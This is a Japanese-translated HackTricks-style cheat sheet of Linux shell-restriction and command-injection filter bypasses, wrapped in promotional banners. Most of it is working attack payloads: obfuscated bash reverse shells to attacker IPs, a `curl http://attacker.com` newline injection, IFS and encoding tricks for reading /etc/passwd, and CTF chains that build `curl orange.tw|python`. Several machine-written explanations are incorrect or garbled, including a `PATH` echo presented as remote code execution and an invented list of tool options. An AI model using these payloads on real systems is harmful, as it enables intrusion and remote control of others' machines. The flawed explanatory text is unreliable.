# Linuxシェルの制限をバイパスする

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

\
[**Trickest**](https://trickest.io/)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 一般的な制限のバイパス

### リバースシェル
```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### 短い逆シェル

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

このコマンドは、逆シェルを確立するために使用されます。`10.0.0.1`は攻撃者のIPアドレスであり、`8080`は攻撃者が待ち受けるポート番号です。このコマンドは、Bashの制限をバイパスして、リモートシステムとの対話的なシェルセッションを確立します。
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### パスと禁止ワードのバイパス

In some cases, you may encounter restrictions on certain paths or forbidden words when trying to execute commands. However, there are ways to bypass these restrictions and execute the desired commands. Here are some techniques you can use:

#### Bypassing Restricted Paths

1. **Using Absolute Paths**: Instead of using relative paths, you can try using absolute paths to access restricted directories. For example, instead of `cd ../restricted`, you can try `cd /home/user/restricted`.

2. **Using Symbolic Links**: Symbolic links can be used to bypass restricted paths. You can create a symbolic link to the restricted directory and access it through the link. For example, `ln -s /restricted /home/user/restricted_link` creates a symbolic link to the `/restricted` directory.

3. **Using Environment Variables**: If the restricted path is defined using an environment variable, you can try overriding the variable with a different value. For example, `export PATH=/usr/local/sbin:$PATH` sets the `PATH` variable to include `/usr/local/sbin` before the original value.

#### Bypassing Forbidden Words

1. **Using Alternative Commands**: If a command is forbidden, you can try using alternative commands that achieve the same result. For example, if `rm` is forbidden, you can try using `unlink` or `mv` to achieve similar functionality.

2. **Using Command Substitution**: Command substitution allows you to execute a command within another command. You can use this technique to bypass forbidden words. For example, instead of using `rm`, you can try `$(which rm)` to execute the `rm` command indirectly.

3. **Using Shell Variables**: Shell variables can be used to bypass forbidden words. You can assign the forbidden command to a variable and then execute the variable. For example, `forbidden_cmd="rm"; $forbidden_cmd file.txt` executes the `rm` command indirectly.

Remember, these techniques should be used responsibly and only for legitimate purposes.
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64


# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### 禁止されたスペースをバイパスする

In some cases, you may encounter restrictions that prevent you from using spaces in certain commands. However, there are alternative ways to bypass these restrictions and execute the desired commands.

以下の場合、特定のコマンドでスペースを使用することが制限されている場合があります。しかし、これらの制限を回避し、必要なコマンドを実行するための代替方法があります。

#### Using quotes

引用符を使用する

One way to bypass the restriction is by enclosing the command or argument containing spaces within quotes. This tells the shell to treat the entire enclosed text as a single entity.

制限を回避する方法の1つは、スペースを含むコマンドや引数を引用符で囲むことです。これにより、シェルは囲まれたテキスト全体を単一のエンティティとして扱います。

For example, instead of typing:

例えば、以下のように入力します：

```
command with spaces
```

You can use quotes to bypass the restriction:

制限を回避するために引用符を使用できます：

```
"command with spaces"
```

#### Using backslashes

バックスラッシュを使用する

Another way to bypass the restriction is by using backslashes to escape the spaces. This tells the shell to treat the following character as a literal character and not as a delimiter.

制限を回避する別の方法は、バックスラッシュを使用してスペースをエスケープすることです。これにより、シェルは次の文字を区切り文字ではなく、リテラル文字として扱います。

For example, instead of typing:

例えば、以下のように入力します：

```
command\ with\ spaces
```

You can use backslashes to bypass the restriction:

制限を回避するためにバックスラッシュを使用できます：

```
command\ with\ spaces
```

By using quotes or backslashes, you can bypass the restrictions on using spaces in commands and execute them successfully.
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### バックスラッシュとスラッシュをバイパスする

バックスラッシュとスラッシュをバイパスする方法について説明します。

#### バックスラッシュをバイパスする

バックスラッシュは、特殊文字として使用されることがありますが、バイパスする方法もあります。以下のコマンドを使用してバックスラッシュをバイパスできます。

```bash
$ echo -e "This is a backslash: \\"
```

上記のコマンドを実行すると、バックスラッシュが正常に表示されます。

#### スラッシュをバイパスする

スラッシュも特殊文字として使用されることがありますが、バイパスする方法もあります。以下のコマンドを使用してスラッシュをバイパスできます。

```bash
$ echo -e "This is a slash: \/"
```

上記のコマンドを実行すると、スラッシュが正常に表示されます。

これらの方法を使用することで、バックスラッシュとスラッシュをバイパスすることができます。
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### パイプのバイパス

Pipes are a powerful feature in Linux that allow the output of one command to be used as the input for another command. However, in some cases, the use of pipes may be restricted by the system administrator for security reasons. In this section, we will discuss some techniques to bypass these restrictions and still be able to use pipes effectively.

パイプはLinuxでの強力な機能であり、あるコマンドの出力を別のコマンドの入力として使用することができます。しかし、セキュリティ上の理由から、システム管理者によってパイプの使用が制限される場合があります。このセクションでは、これらの制限を回避し、効果的にパイプを使用するためのいくつかのテクニックについて説明します。

#### Using Process Substitution

プロセス置換を使用する

One way to bypass pipe restrictions is by using process substitution. Process substitution allows you to treat the output of a command as a file, which can then be used as the input for another command. This can be achieved by using the `<()` syntax.

パイプの制限を回避する方法の一つは、プロセス置換を使用することです。プロセス置換を使用すると、コマンドの出力をファイルとして扱い、それを別のコマンドの入力として使用することができます。これは、`<()` 構文を使用することで実現できます。

For example, instead of using `command1 | command2`, you can use `command2 < <(command1)` to achieve the same result.

例えば、`command1 | command2` の代わりに、同じ結果を得るために `command2 < <(command1)` を使用することができます。

#### Using Temporary Files

一時ファイルの使用

Another way to bypass pipe restrictions is by using temporary files. Instead of directly piping the output of one command to another, you can redirect the output to a temporary file and then use that file as the input for the next command.

パイプの制限を回避する別の方法は、一時ファイルを使用することです。コマンドの出力を直接別のコマンドにパイプする代わりに、出力を一時ファイルにリダイレクトし、そのファイルを次のコマンドの入力として使用することができます。

For example, instead of using `command1 | command2`, you can use `command1 > temp_file && command2 < temp_file` to achieve the same result.

例えば、`command1 | command2` の代わりに、同じ結果を得るために `command1 > temp_file && command2 < temp_file` を使用することができます。

#### Conclusion

結論

By using process substitution or temporary files, you can bypass pipe restrictions and still be able to use pipes effectively in Linux. These techniques can be useful in situations where pipe usage is restricted but still necessary for certain tasks.

プロセス置換や一時ファイルを使用することで、Linuxでパイプの制限を回避し、効果的にパイプを使用することができます。これらのテクニックは、パイプの使用が制限されているが特定のタスクには必要な場合に役立ちます。
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### 16進数エンコーディングを使用してバイパスする

Bashの制限を回避するために、16進数エンコーディングを使用する方法があります。これにより、特殊文字や制御文字をバイパスすることができます。

以下のコマンドを使用して、16進数エンコーディングを行います。

```bash
echo -e "\x68\x65\x6c\x6c\x6f"
```

このコマンドは、16進数エンコーディングされた文字列をデコードして表示します。上記の例では、"hello"という文字列が表示されます。

16進数エンコーディングを使用することで、特殊文字や制御文字を回避し、Bashの制限をバイパスすることができます。ただし、16進数エンコーディングは可読性が低くなるため、注意が必要です。
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### IPのバイパス

IP制限を回避するためのテクニックです。

#### IP制限の回避方法

1. **IPスプーフィング**: 攻撃者は自身のIPアドレスを偽装して、制限されたIPアドレスとして振る舞います。これにより、制限を回避することができます。

2. **プロキシサーバーの使用**: 攻撃者はプロキシサーバーを使用して、自身のIPアドレスを隠し、制限されたIPアドレスからの通信を行います。これにより、制限を回避することができます。

3. **VPNの使用**: 攻撃者はVPN（仮想プライベートネットワーク）を使用して、自身のIPアドレスを隠し、制限されたIPアドレスからの通信を行います。これにより、制限を回避することができます。

4. **トーチング**: 攻撃者は制限されたIPアドレスに対して、大量のトラフィックを送信することで、サービスの停止や制限の回避を試みます。

5. **IPアドレスの変更**: 攻撃者は自身のIPアドレスを変更することで、制限を回避することができます。これには、ダイナミックIPアドレスの再割り当てや、プロバイダーの変更などが含まれます。

これらのテクニックを使用することで、IP制限を回避することができますが、違法行為や不正アクセスには注意が必要です。
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### 時間ベースのデータの外部流出

Time based data exfiltration is a technique used by hackers to extract sensitive information from a target system over a period of time. This technique is particularly useful when traditional methods of exfiltration, such as transferring large amounts of data at once, are not feasible or likely to be detected.

To perform time based data exfiltration, hackers typically use covert channels that allow them to transmit small amounts of data at regular intervals without raising suspicion. This can be achieved through various means, such as manipulating the timing of network requests or using steganography techniques to hide data within innocuous files.

By spreading the exfiltration process over an extended period of time, hackers can avoid triggering any immediate alarms or detection mechanisms. This allows them to slowly and discreetly gather the desired information without raising suspicion.

To defend against time based data exfiltration, it is important to implement robust monitoring and detection systems that can identify unusual patterns or behaviors. Additionally, regular security audits and vulnerability assessments can help identify and patch any potential vulnerabilities that hackers may exploit for exfiltration purposes.

Overall, time based data exfiltration is a stealthy technique that can be used by hackers to extract sensitive information without raising suspicion. By understanding how this technique works, organizations can better protect their systems and data from such attacks.
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### 環境変数から文字を取得する

You can use the `echo` command along with the `$` symbol to retrieve characters from environment variables. Here's how you can do it:

```bash
$ echo $ENV_VARIABLE_NAME
```

Replace `ENV_VARIABLE_NAME` with the name of the environment variable you want to retrieve characters from. This command will display the value of the specified environment variable.

For example, if you want to retrieve characters from the `PATH` environment variable, you can use the following command:

```bash
$ echo $PATH
```

This will display the value of the `PATH` environment variable, which contains a list of directories where executable files are located.

Keep in mind that environment variables may contain sensitive information, so be cautious when using this technique.
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### DNSデータの外部流出

例えば、**burpcollab**または[**pingb**](http://pingb.in)を使用することができます。

### 組み込み関数

外部関数を実行することができず、**RCEを取得するために制限された組み込み関数にアクセス**できる場合、いくつかの便利なトリックがあります。通常、**すべての組み込み関数を使用することはできない**ため、刑務所をバイパスするためにすべてのオプションを**知っておく必要があります**。[**devploit**](https://twitter.com/devploit)からのアイデアです。\
まず、すべての[**シェルの組み込み関数**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**をチェック**してください。次に、以下はいくつかの**おすすめの方法**です：
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### ポリグロットコマンドインジェクション

Polyglot command injection is a technique used to bypass restrictions on command execution by injecting malicious commands that can be interpreted by multiple programming languages. This allows an attacker to execute arbitrary commands on a target system, even if the system is configured to restrict the use of certain commands or characters.

To perform a polyglot command injection, an attacker needs to find a command that can be interpreted differently by different programming languages. For example, the following command can be interpreted as a valid command in both Bash and Python:

```
echo 'Hello, World!'
```

In Bash, this command will simply print the string "Hello, World!" to the console. However, in Python, this command will be interpreted as a string literal and will not produce any output.

By leveraging this behavior, an attacker can inject malicious commands that will be executed by the target system, regardless of the restrictions in place. For example, consider the following payload:

```
'; python -c "import os; os.system('id')"; #
```

In this payload, the attacker uses the semicolon (;) to terminate the original command and injects a Python command that will execute the `id` command. The `#` at the end is used to comment out any remaining characters and ensure that the payload is interpreted correctly.

By injecting this payload into a vulnerable application, the attacker can execute arbitrary commands on the target system, bypassing any restrictions that may be in place.

It is important to note that polyglot command injection can be a powerful technique, but it requires a deep understanding of the target system and the programming languages involved. Additionally, it is highly recommended to use this technique responsibly and only in controlled environments for legitimate purposes, such as penetration testing or security research.
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### 正規表現の回避

To bypass potential regexes, you can try the following techniques:

正規表現を回避するために、以下のテクニックを試すことができます。

- Use alternative characters: Instead of using the characters that are blocked by the regex, try using alternative characters that have a similar appearance or functionality.

  - 代替文字の使用: 正規表現でブロックされている文字の代わりに、外見や機能が似ている代替文字を使用してみてください。

- Modify the regex pattern: If you have access to the regex pattern, you can modify it to exclude the specific characters or patterns that are being blocked.

  - 正規表現パターンの変更: 正規表現パターンにアクセスできる場合は、ブロックされている特定の文字やパターンを除外するように変更することができます。

- Use encoding or obfuscation techniques: Encode or obfuscate the input data in a way that bypasses the regex restrictions. This can include techniques such as URL encoding, base64 encoding, or character substitution.

  - エンコーディングや難読化技術の使用: 入力データをエンコードや難読化して、正規表現の制限を回避する方法を使用します。これには、URLエンコーディング、base64エンコーディング、または文字の置換などの技術が含まれます。

- Break the input into multiple parts: If the regex is applied to the entire input string, you can try breaking the input into multiple parts and bypassing the regex by submitting each part separately.

  - 入力を複数の部分に分割する: 正規表現が入力文字列全体に適用される場合は、入力を複数の部分に分割し、各部分を個別に送信することで正規表現を回避することができます。

Remember that bypassing regexes may be considered unethical or illegal in certain situations. Always ensure that you have proper authorization and follow ethical guidelines when performing any hacking techniques.

正規表現の回避は、特定の状況では非倫理的または違法と見なされる場合があります。常に適切な認可を持っていることを確認し、ハッキング技術を実行する際には倫理的なガイドラインに従ってください。
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### Bashfuscator

Bashfuscatorは、Bashスクリプトの制限を回避するためのツールです。これを使用すると、スクリプトの解析や検出を困難にすることができます。

#### インストール

Bashfuscatorをインストールするには、次のコマンドを実行します。

```bash
$ git clone https://github.com/Bashfuscator/Bashfuscator.git
$ cd Bashfuscator
$ sudo ./install.sh
```

#### 使用方法

Bashfuscatorを使用するには、次のコマンドを実行します。

```bash
$ bashfuscator <input_script> <output_script>
```

`<input_script>`は、変換したいBashスクリプトのパスを指定します。`<output_script>`は、変換後のスクリプトの保存先を指定します。

#### オプション

Bashfuscatorには、さまざまなオプションがあります。以下は一部のオプションの例です。

- `-o, --obfuscate`: スクリプトを難読化します。
- `-e, --encrypt`: スクリプトを暗号化します。
- `-c, --compress`: スクリプトを圧縮します。
- `-m, --minify`: スクリプトを最小化します。

これらのオプションを組み合わせることで、さまざまな制限回避技術を実現することができます。

#### 注意事項

Bashfuscatorは、スクリプトの解析を困難にするためのツールですが、完全なセキュリティを提供するものではありません。セキュリティを強化するためには、他の対策も併用することをおすすめします。
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### 5文字でのRCE

```bash
$ echo ${PATH//:/\n}
```

このコマンドは、5文字のみでRCE（リモートコード実行）を実現します。
```bash
# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Oragnge Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```
### 4文字でのRCE

このテクニックでは、わずか4文字のコマンドを使用して、リモートコード実行（RCE）を達成します。

#### 方法

1. まず、以下のコマンドを使用して、シェルにアクセスします。

```bash
bash -i
```

2. 次に、以下のコマンドを実行して、RCEを達成します。

```bash
>& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1
```

ここで、`<attacker_ip>`は攻撃者のIPアドレス、`<attacker_port>`は攻撃者が待ち受けるポート番号です。

#### 注意事項

- このテクニックは、ターゲットシステムが`/dev/tcp`デバイスファイルをサポートしている場合にのみ機能します。
- ターゲットシステムが制限された環境で実行されている場合、このテクニックは機能しない可能性があります。
- 攻撃者は、攻撃者のIPアドレスとポート番号を正しく設定する必要があります。

このテクニックを使用すると、わずか4文字のコマンドでRCEを達成できます。ただし、環境によっては機能しない場合があるため、注意が必要です。
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## Read-Only/Noexec Bypass

もし**読み取り専用およびnoexecの保護**が有効なファイルシステム内にいる場合でも、**任意のバイナリを実行**する方法があります。その1つは、**DDexec**の使用です。このテクニックの説明は以下で見つけることができます：

{% content-ref url="../bypass-linux-shell-restrictions/ddexec.md" %}
[ddexec.md](../bypass-linux-shell-restrictions/ddexec.md)
{% endcontent-ref %}

## Chrootおよびその他のJails Bypass

{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
{% endcontent-ref %}

## 参考文献とその他

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
* [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
* [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
* [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)

![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

\
[**Trickest**](https://trickest.io/)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築および自動化**できます。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したいですか？または、**HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **および** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。

</details>
